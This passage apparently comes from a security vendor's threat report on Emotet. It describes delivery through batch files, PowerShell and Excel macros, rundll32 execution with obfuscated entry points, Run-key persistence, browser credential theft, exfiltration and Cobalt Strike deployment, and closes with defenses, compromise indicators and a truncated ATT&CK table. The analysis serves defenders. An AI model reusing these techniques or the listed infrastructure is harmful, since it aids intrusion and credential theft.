<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=846&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png" alt="image23-Feb-08-2022-10-56-11-68-PM" width="846" loading="lazy" style="width: 846px;" srcset="https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=423&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 423w, https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=846&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 846w, https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=1269&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 1269w, https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=1692&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 1692w, https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=2115&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 2115w, https://www.cybereason.com/hs-fs/hubfs/image23-Feb-08-2022-10-56-11-68-PM.png?width=2538&amp;name=image23-Feb-08-2022-10-56-11-68-PM.png 2538w" sizes="(max-width: 846px) 100vw, 846px"></em><span style="font-size: 16px;"><em>Execution of .bat file (yksds.bat) that executes PowerShell code which downloads and executes Emotet as seen in the Cybereason XDR Platform</em></span></p>
<p>The PowerShell code uses the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32" rel="noopener" target="_blank"><em><span>rundll32</span></em></a> Windows utility and specifies the DLL entry point <em>Control_RunDLL</em> or <em>DllRegisterServer</em> to execute Emotet. We observed that <em>rundll32</em> maps the Emotet DLL file under the <a href="https://docs.microsoft.com/en-us/windows/win32/menurc/versioninfo-resource" rel="noopener" target="_blank"><span>internal name</span></a> of <em>X.dll</em>:</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=799&amp;name=image30-4.png" alt="image30-4" width="799" loading="lazy" style="width: 799px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=400&amp;name=image30-4.png 400w, https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=799&amp;name=image30-4.png 799w, https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=1199&amp;name=image30-4.png 1199w, https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=1598&amp;name=image30-4.png 1598w, https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=1998&amp;name=image30-4.png 1998w, https://www.cybereason.com/hs-fs/hubfs/image30-4.png?width=2397&amp;name=image30-4.png 2397w" sizes="(max-width: 799px) 100vw, 799px"><span style="font-size: 16px;"><em>rundll32 executes Emotet: DllRegisterServer DLL entry point as seen in the Cybereason XDR Platform</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=815&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png" alt="image19-Feb-08-2022-10-58-15-28-PM" width="815" loading="lazy" style="width: 815px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=408&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 408w, https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=815&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 815w, https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=1223&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 1223w, https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=1630&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 1630w, https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=2038&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 2038w, https://www.cybereason.com/hs-fs/hubfs/image19-Feb-08-2022-10-58-15-28-PM.png?width=2445&amp;name=image19-Feb-08-2022-10-58-15-28-PM.png 2445w" sizes="(max-width: 815px) 100vw, 815px"></em><span style="font-size: 16px;"><em>rundll32 maps an Emotet DLL file under the internal name of X.dll as seen in the Cybereason XDR Platform</em></span></p>
<h4 style="font-weight: bold; line-height: 1.75;">Distribution: Office Excel Document</h4>
<p>If an Office Excel document distributes Emotet, the Office Excel application prompts the user that has opened the document to enable Office macro execution. The Excel document contains several hidden Excel worksheets that store malicious Office macros that distribute Emotet.</p>
<p>When the user enables macro execution, the Office macros execute:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=705&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png" alt="image22-Feb-08-2022-10-59-23-89-PM" width="705" loading="lazy" style="width: 705px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=353&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 353w, https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=705&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 705w, https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=1058&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 1058w, https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=1410&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 1410w, https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=1763&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 1763w, https://www.cybereason.com/hs-fs/hubfs/image22-Feb-08-2022-10-59-23-89-PM.png?width=2115&amp;name=image22-Feb-08-2022-10-59-23-89-PM.png 2115w" sizes="(max-width: 705px) 100vw, 705px"></em><span style="font-size: 16px;"><em>Office Excel application prompts a user to enable macro execution</em></span></p>
<p>The macros establish a connection to an attacker-controlled endpoint to download the Emotet malware. Emotet typically arrives from the attacker-controlled endpoint in the form of a DLL file that the macros store under a filename with the extension .<em>ocx</em>, such as <em>besta.ocx</em>, <em>bestb.ocx</em>, or <em>bestc.ocx</em>.&nbsp;</p>
<p>The macros use the <em>rundll32</em> Windows utility and specify the DLL entry point <em>Control_RunDLL</em> or <em>DllRegisterServer</em> to execute Emotet. The macros may obfuscate the DLL entry point name by appending the ampersand (<em>&amp;</em>) character to individual characters of the name:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=780&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png" alt="rundll32 executes Emotet" width="780" loading="lazy" style="width: 780px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=390&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 390w, https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=780&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 780w, https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=1170&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 1170w, https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=1560&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 1560w, https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=1950&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 1950w, https://www.cybereason.com/hs-fs/hubfs/image17-Feb-08-2022-11-00-18-72-PM.png?width=2340&amp;name=image17-Feb-08-2022-11-00-18-72-PM.png 2340w" sizes="(max-width: 780px) 100vw, 780px"></em><span style="font-size: 16px;"><em>rundll32 executes Emotet: DllRegisterServer DLL entry point as seen in the Cybereason XDR Platform</em></span></p>
<h4 style="font-weight: bold; line-height: 1.75;">Malicious Activities</h4>
<p>When Emotet executes on a compromised system, the malware first establishes persistence by creating system services that start at system startup or by creating registry values at the <em>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</em> registry key:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=868&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png" alt="Emotet DLL File" width="868" loading="lazy" style="width: 868px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=434&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 434w, https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=868&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 868w, https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=1302&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 1302w, https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=1736&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 1736w, https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=2170&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 2170w, https://www.cybereason.com/hs-fs/hubfs/image13-Feb-08-2022-11-01-18-72-PM.png?width=2604&amp;name=image13-Feb-08-2022-11-01-18-72-PM.png 2604w" sizes="(max-width: 868px) 100vw, 868px"></em><span style="font-size: 16px;"><em>Emotet (DLL file: oxneternhgbtah.ybc) establishes persistence on compromised system as seen in the Cybereason XDR Platform</em></span></p>
<p>Emotet then executes processes that conduct malicious activities. The processes that Emotet executes have random names and are children processes of the process of the <em>rundll32</em> utility that executes Emotet.&nbsp;</p>
<p>In the attack scenario that we analyzed, Emotet executed a process that steals cookies or web and email credentials from client credential databases. Emotet used the keyword <em>scomma</em> in the process command line to <a href="https://www.virusbulletin.com/virusbulletin/2019/10/vb2019-paper-exploring-emotet-elaborate-everyday-enigma/" rel="noopener" target="_blank"><span>execute</span></a> <em>WebBrowserPassView</em>, a tool that steals web credentials from browser credential databases. Emotet then exfiltrated data from the compromised system to attacker-controlled endpoints:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=469&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png" alt="image1-Feb-08-2022-11-02-07-11-PM" width="469" loading="lazy" style="width: 469px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=235&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 235w, https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=469&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 469w, https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=704&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 704w, https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=938&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 938w, https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=1173&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 1173w, https://www.cybereason.com/hs-fs/hubfs/image1-Feb-08-2022-11-02-07-11-PM.png?width=1407&amp;name=image1-Feb-08-2022-11-02-07-11-PM.png 1407w" sizes="(max-width: 469px) 100vw, 469px"></em><span style="font-size: 16px;"><em>Emotet executes processes that conduct malicious activities as seen in the Cybereason XDR Platform</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=810&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png" alt="image10-Feb-08-2022-11-03-08-76-PM" width="810" loading="lazy" style="width: 810px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=405&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 405w, https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=810&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 810w, https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=1215&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 1215w, https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=1620&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 1620w, https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=2025&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 2025w, https://www.cybereason.com/hs-fs/hubfs/image10-Feb-08-2022-11-03-08-76-PM.png?width=2430&amp;name=image10-Feb-08-2022-11-03-08-76-PM.png 2430w" sizes="(max-width: 810px) 100vw, 810px"></em><span style="font-size: 16px;"><em>Emotet executes the WebBrowserPassView tool as seen in the Cybereason XDR Platform</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=801&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png" alt="emotet exfiltration" width="801" loading="lazy" style="width: 801px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=401&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 401w, https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=801&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 801w, https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=1202&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 1202w, https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=1602&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 1602w, https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=2003&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 2003w, https://www.cybereason.com/hs-fs/hubfs/image5-Feb-08-2022-11-03-50-22-PM.png?width=2403&amp;name=image5-Feb-08-2022-11-03-50-22-PM.png 2403w" sizes="(max-width: 801px) 100vw, 801px"></em><span style="font-size: 16px;"><em>Emotet exfiltrates data as seen in the Cybereason XDR Platform</em></span></p>
<p>After Emotet exfiltrated data, the Emotet operators deployed the Cobalt Strike framework on the compromised system. Emotet deployed a Cobalt Strike beacon in the form of a DLL file and executed the beacon by invoking the <em>DllRegisterServer</em> DLL entry point.</p>
<h2 style="font-weight: normal;">Detection and Prevention of emotet</h2>
<h3 style="font-weight: normal;">Cybereason XDR Platform</h3>
<p>The<a href="/platform" rel="noopener" target="_blank"><span> Cybereason XDR Platform</span></a> is able to detect and prevent IcedID, QBot, and Emotet using multi-layer protection that detects and blocks malware with threat intelligence, machine learning, and Next-gen Antivirus (NGAV) capabilities:</p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=685&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png" alt="cybereason detects IceID Injection" width="685" loading="lazy" style="width: 685px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=343&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 343w, https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=685&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 685w, https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=1028&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 1028w, https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=1370&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 1370w, https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=1713&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 1713w, https://www.cybereason.com/hs-fs/hubfs/image28-Feb-08-2022-11-04-48-33-PM.png?width=2055&amp;name=image28-Feb-08-2022-11-04-48-33-PM.png 2055w" sizes="(max-width: 685px) 100vw, 685px"></em><span style="font-size: 16px;"><em>Cybereason XDR Platform detects IcedID injecting code into a cmd.exe instance</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=761&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png" alt="image35-Feb-08-2022-11-06-04-22-PM" width="761" loading="lazy" style="width: 761px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=381&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 381w, https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=761&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 761w, https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=1142&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 1142w, https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=1522&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 1522w, https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=1903&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 1903w, https://www.cybereason.com/hs-fs/hubfs/image35-Feb-08-2022-11-06-04-22-PM.png?width=2283&amp;name=image35-Feb-08-2022-11-06-04-22-PM.png 2283w" sizes="(max-width: 761px) 100vw, 761px"></em><span style="font-size: 16px;"><em>Cybereason XDR Platform detects IcedID executing a Cobalt Strike loader implemented in adobe.dll</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=761&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png" alt="image6-Feb-08-2022-11-06-50-43-PM" width="761" loading="lazy" style="width: 761px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=381&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 381w, https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=761&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 761w, https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=1142&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 1142w, https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=1522&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 1522w, https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=1903&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 1903w, https://www.cybereason.com/hs-fs/hubfs/image6-Feb-08-2022-11-06-50-43-PM.png?width=2283&amp;name=image6-Feb-08-2022-11-06-50-43-PM.png 2283w" sizes="(max-width: 761px) 100vw, 761px"></em><span style="font-size: 16px;"><em>Cybereason XDR Platform detects a malicious Office macro executing QBot using the regsvr32 Windows utility</em></span></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=778&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png" alt="cybereason emotet detection" width="778" loading="lazy" style="width: 778px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=389&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 389w, https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=778&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 778w, https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=1167&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 1167w, https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=1556&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 1556w, https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=1945&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 1945w, https://www.cybereason.com/hs-fs/hubfs/image15-Feb-08-2022-11-07-45-87-PM.png?width=2334&amp;name=image15-Feb-08-2022-11-07-45-87-PM.png 2334w" sizes="(max-width: 778px) 100vw, 778px"></em><span style="font-size: 16px;"><em>Cybereason XDR Platform detects a malicious Office Excel document that distributes Emotet</em></span></p>
<h3 style="font-weight: normal;">Cybereason GSOC MDR</h3>
<p>The Cybereason GSOC recommends the following:</p>
<ul>
<li aria-level="1">Enable the <em>Anti-Malware</em> feature in the Cybereason NGAV module and enable the <a href="https://nest.cybereason.com/documentation/product-documentation/190/anti-malware-settings" rel="noopener" target="_blank">Detect and Prevent modes</a> of this feature.</li>
<li aria-level="1">Securely handle email messages that originate from external sources. This includes disabling hyperlinks and investigating the content of email messages to identify phishing attempts.</li>
<li aria-level="1">Threat Hunting with Cybereason: The Cybereason MDR team provides its customers with custom hunting queries for detecting specific threats - to find out more about threat hunting and <a href="/platform/managed-detection-response-mdr" rel="noopener" target="_blank"><span>Managed Detection and Response</span></a> with the Cybereason Defense Platform, <a href="/services/managed-detection-response-mdr#form" rel="noopener" target="_blank"><span>contact a Cybereason Defender here</span></a>.</li>
<ul>
<li aria-level="2">For Cybereason customers: More details <a href="https://nest.cybereason.com/knowledgebase/5191271" rel="noopener" target="_blank"><span>available on the NEST</span></a> including custom threat hunting queries for detecting this threat.</li>
</ul>
</ul>
<p>Cybereason is dedicated to teaming up with defenders to end cyber attacks from endpoints to the enterprise to everywhere.<a href="/request-a-demo" rel="noopener" target="_blank"><span> Schedule a demo today</span></a> to learn how your organization can benefit from an<a href="/blog/the-cybereason-malop-achieving-operation-centric-security" rel="noopener" target="_blank"><span> operation-centric approach</span></a> to security.</p>
<h2 style="font-weight: normal;"><span style="color: #595955;">Indicators of Compromise</span></h2>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2; width: 721px; height: 679.292px;">
<tbody>
<tr style="height: 195.292px;">
<td style="border: 0.99609pt solid #000000; width: 187.25px; height: 195px;">
<p><strong>Executables</strong></p>
</td>
<td style="border: 0.99609pt solid #000000; width: 532.417px; height: 195px;">
<p>SHA-1 hash:&nbsp;</p>
<p><em>a4d415c07b4ff77c6bd792c32fc46bfc6a1b0354</em></p>
<p>SHA-1 hash:&nbsp;</p>
<p><em>e8992a283f9f37dec617b305db2790d9112d3a20</em></p>
</td>
</tr>
<tr style="height: 337.333px;">
<td style="border: 0.99609pt solid #000000; width: 187.25px; height: 337px;">
<p><strong>Domains</strong></p>
</td>
<td style="border: 0.99609pt solid #000000; width: 532.417px; height: 337px;">
<p><em>zasewalli[.]fun</em></p>
<p><em>endofyour[.]ink</em></p>
<p><em>pedrosimanez[.]fun</em></p>
<p><em>kingflipp[.]online</em></p>
<p><em>beliale232634[.]at</em></p>
<p><em>belialw869367[.]at</em></p>
<p><em>belialq449663[.]at</em></p>
</td>
</tr>
<tr style="height: 145.333px;">
<td style="border: 0.99609pt solid #000000; width: 187.25px; height: 145px;">
<p><strong>IP Addresses</strong></p>
</td>
<td style="border: 0.99609pt solid #000000; width: 532.417px; height: 145px;">
<p><em>23.111.114[.]52</em></p>
<p><em>104.168.44[.]130</em></p>
<p><em>185.70.184[.]8</em></p>
</td>
</tr>
</tbody>
</table>
<p style="font-weight: normal;">&nbsp;</p>
<h2 style="font-weight: normal;"><span style="color: #595955;">MITRE ATT&amp;CK Techniques: Cobalt Strike, IceID, Emotet and QBOT</span></h2>
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2; width: 108.116%; height: 879.625px;">
<tbody>
<tr style="height: 109.292px;">
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 14.0464%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Initial Access</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 15.0742%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Execution</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 12.3335%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Persistence</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 12.6761%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Defense Evasion</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 11.9909%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Credential Access</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 10.9631%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Discovery</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 11.8767%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Lateral Movement</strong></span></p>
</td>
<td style="background-color: #f1c232; border: 0.98958pt solid #000000; width: 11.0773%; height: 109px;">
<p><span style="font-size: 12px;"><strong>Exfiltration</strong></span></p>
</td>
</tr>
<tr style="height: 280px;">
<td style="border: 0.98958pt solid #000000; width: 14.0464%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1566/001/" rel="noopener" target="_blank">Phishing: Spearphishing Attachment</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 15.0742%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1204/002/" rel="noopener" target="_blank">User Execution: Malicious File</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 12.3335%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1053/005/" rel="noopener" target="_blank">Scheduled Task/Job: Scheduled Task</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 12.6761%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener" target="_blank">Abuse Elevation Control Mechanism: Bypass User Account Control</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.9909%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1555/003/" rel="noopener" target="_blank">Credentials from Web Browsers</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 10.9631%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1087/" rel="noopener" target="_blank">Account Discovery</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.8767%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1021/001/" rel="noopener" target="_blank">Remote Services: Remote Desktop Protocol</a></span></p>
<br><br></td>
<td style="border: 0.98958pt solid #000000; width: 11.0773%; height: 280px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1048/">Exfiltration Over Alternative Protocol</a></span></p>
</td>
</tr>
<tr style="height: 175px;">
<td style="border: 0.98958pt solid #000000; width: 14.0464%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 15.0742%; height: 175px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1047/" rel="noopener" target="_blank">Windows Management Instrumentation</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 12.3335%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 12.6761%; height: 175px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1218/010/" rel="noopener" target="_blank">Signed Binary Proxy Execution: Regsvr32</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.9909%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 10.9631%; height: 175px;">
<p><span style="font-size: 12px;"><a href="https://attack.mitre.org/techniques/T1482/" rel="noopener" target="_blank">Domain Trust Discovery</a></span></p>
</td>
<td style="border: 0.98958pt solid #000000; width: 11.8767%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 11.0773%; height: 175px;">&nbsp;</td>
</tr>
<tr style="height: 175px;">
<td style="border: 0.98958pt solid #000000; width: 14.0464%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 15.0742%; height: 175px;">&nbsp;</td>
<td style="border: 0.98958pt solid #000000; width: 12.3335%; height: 175px;">&nbsp;</td>
